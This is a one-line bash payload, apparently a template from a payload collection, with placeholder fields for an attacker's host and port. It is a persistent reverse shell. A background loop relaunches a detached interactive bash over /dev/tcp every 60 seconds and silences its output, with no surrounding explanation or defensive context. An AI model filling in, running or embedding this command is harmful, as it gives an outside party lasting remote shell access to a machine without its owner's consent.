while :; do setsid bash -i &>/dev/tcp/§LHOST§/§LPORT§ 0>&1; sleep 60; done &>/dev/null &
